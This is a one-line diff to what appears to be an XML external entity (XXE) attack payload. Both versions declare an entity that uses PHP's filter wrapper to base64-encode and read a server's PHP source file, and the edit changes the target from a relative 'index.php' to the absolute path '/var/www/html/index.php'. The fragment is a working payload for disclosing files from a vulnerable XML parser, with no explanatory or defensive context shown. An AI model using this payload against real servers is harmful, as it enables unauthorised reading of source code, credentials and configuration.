@@ -1,1 +1,1 @@
-<!ENTITY b SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+<!ENTITY b SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
